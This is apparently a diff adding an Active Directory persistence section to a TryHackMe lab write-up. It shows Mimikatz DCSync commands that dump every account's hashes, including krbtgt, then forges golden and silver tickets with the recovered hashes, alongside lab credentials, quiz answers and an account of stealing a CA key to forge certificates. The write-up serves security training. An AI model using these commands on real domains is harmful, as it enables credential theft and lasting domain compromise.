@@ -1854,3 +1854,170 @@ token::whoami
 ```
 
 If Enterprise Admins is listed, you have gained full control over TRYHACKME.LOC
+
+## Persisting Active Directory
+
+Active Directory (AD) persistence is a crucial phase in maintaining long-term access after compromising a network. Once an attacker gains high privileges, the next step is ensuring continued access even if the compromised credentials are reset. This module explores various persistence techniques, starting with credential-based persistence, focusing on DC Sync attacks.
+
+In an enterprise environment, multiple domain controllers (DCs) ensure authentication services across different locations. To maintain synchronization, domain controllers use a process called DC Synchronization (DC Sync), allowing them to replicate account information, including password hashes. However, certain privileged accounts—such as those in the Domain Admins or Enterprise Admins groups—also have replication permissions. If an attacker compromises such an account, they can abuse DC Sync to extract password hashes for any user, including the krbtgt account, enabling Golden Ticket attacks.
+
+In this module, we will use Mimikatz to perform a DC Sync attack, demonstrating how an attacker can retrieve password hashes for all accounts within a domain. By obtaining these credentials, an attacker can either crack them offline or use Pass-the-Hash (PtH) techniques to authenticate without knowing the plaintext password. Additionally, we discuss how to identify and prioritize high-value credentials, such as local administrator accounts, service accounts, and privileged AD service accounts, ensuring persistence in the network.
+
+Understanding and practicing these techniques is vital for both offensive and defensive security. While red teamers use them to maintain access, blue teamers must monitor replication events and secure privileged accounts to prevent unauthorized access.
+
+For this task we have privileged credentials provided for `thmwrk1` machine: `Administrator:tryhackmewouldnotguess1@`. Let's use them to gain access to the machine via ssh:
+
+```bash
+ssh za.tryhackme.loc\\Administrator@thmwrk1.za.tryhackme.loc
+```
+
+And start `mimikatz` once we're in:
+
+```cmd
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+```
+
+Now we need to start a DC sync of our low-privileged account `justin.barnes`:
+
+```
+lsadump::dcsync /domain:za.tryhackme.loc /user:justin.barnes
+```
+
+Ther's a lot of output including an NTLM hash of the account. We need to do this with every single account, which is only possible if we enable logging on `mimikatz`:
+
+```
+log gremlin-0x_dcdump.txt
+```
+
+And now proceed to DC sync all users:
+
+```
+lsadump::dcsync /domain:za.tryhackme.loc /all
+```
+
+This will take a while. 
+
+- What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?
+
+__`lsadump::dcsync /domain:za.tryhackme.loc /user:test`__
+
+Let's also get the NTLM hash for `krbtgt`:
+
+```
+lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
+```
+
+Golden and Silver Tickets are methods used to bypass Kerberos authentication in Active Directory environments. A Golden Ticket is a forged Ticket Granting Ticket (TGT), which allows an attacker to request access to services across the entire domain. To create a Golden Ticket, an attacker needs the KRBTGT account's password hash, and once created, the ticket remains valid until the KRBTGT password is manually changed, which is a complex process for the blue team.
+
+A Silver Ticket, on the other hand, is a forged Ticket Granting Service (TGS) ticket that targets specific services on a particular machine. Unlike Golden Tickets, Silver Tickets don't involve the domain controller, making them harder to detect as they only appear in logs on the target machine. While they are more limited in scope compared to Golden Tickets, Silver Tickets still provide significant access to resources and are harder to defend against due to the complexity of rotating machine account passwords.
+
+Now let's generate some silver and golden tickets. We will start with the low privilege account:
+
+```bash
+ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
+```
+
+Once in, switch to `powershell`:
+
+```cmd
+powershell
+```
+
+Use `Get-ADDomain` cmdlet:
+
+```powershell
+Get-ADDomain
+...
+DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
+...
+```
+
+Now that we have the domain's SID let's launch `mimikatz` again and generate a golden ticket:
+
+```
+kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
+```
+
+The output should look something like this:
+
+```
+User      : ReallyNotALegitAccount
+Domain    : za.tryhackme.loc (ZA)
+SID       : S-1-5-21-3885271727-2693558621-2658995185
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
+Lifetime  : 3/23/2025 1:35:20 PM ; 3/23/2025 11:35:20 PM ; 3/30/2025 1:35:20 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
+```
+
+Now let's exit `mimikatz` and verify the ticket is working:
+
+```powershell
+dir \\thmdc.za.tryhackme.loc\c$\
+```
+
+Let's also generate silver ticket for stronger persistence, back in `mimikatz`:
+
+```
+kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
+```
+
+The output should look something like this:
+
+```
+User      : StillNotALegitAccount
+Domain    : za.tryhackme.loc (ZA)
+SID       : S-1-5-21-3885271727-2693558621-2658995185
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 4c02d970f7b3da7f8ab6fa4dc77438f4 - rc4_hmac_nt
+Service   : cifs
+Target    : thmserver1.za.tryhackme.loc
+Lifetime  : 3/23/2025 1:47:37 PM ; 3/21/2035 1:47:37 PM ; 3/21/2035 1:47:37 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'StillNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
+```
+
+We can verify it once again by:
+
+```powershell
+dir \\thmserver1.za.tryhackme.loc\c$\
+```
+
+- Which AD account's NTLM hash is used to sign Kerberos tickets?
+__`krbtgt`__
+
+- What is the name of a ticket that impersonates a legitimate TGT?
+__Golden Ticket__
+
+- What is the name of a ticket that impersonates a legitimate TGS?
+__Silver Ticket__
+
+- What is the default lifetime (in years) of a golden ticket generated by Mimikatz?
+__10 years__
+
+By leveraging Active Directory Certificate Services (AD CS), attackers can maintain access through valid client authentication certificates. Even if account credentials are rotated, certificates allow continuous Ticket Granting Ticket (TGT) requests unless revoked or expired—typically lasting up to five years. A more severe attack involves compromising the Certificate Authority (CA) itself. By stealing the root CA's private key, attackers can issue their own certificates at will, bypassing standard revocation mechanisms.
+
+Extracting the CA private key is possible if it isn’t protected by a Hardware Security Module (HSM). Tools like Mimikatz and SharpDPAPI can retrieve it from the CA server, which is typically protected only by the machine’s Data Protection API (DPAPI). Once extracted, Mimikatz can patch memory to make the key exportable, allowing the attacker to save it in PFX format.
+
+With the stolen CA certificate and key, attackers can use tools like ForgeCert to generate new authentication certificates for any user, including domain administrators. These forged certificates can be used with Rubeus to request Kerberos tickets, granting full domain access without the need for credentials. The only way defenders can respond is by rotating the CA, which forces revocation of all issued certificates—an enormous operational burden.
+
+This method of persistence is one of the hardest to detect and mitigate, making it an ultimate backdoor into an enterprise environment.
+
+
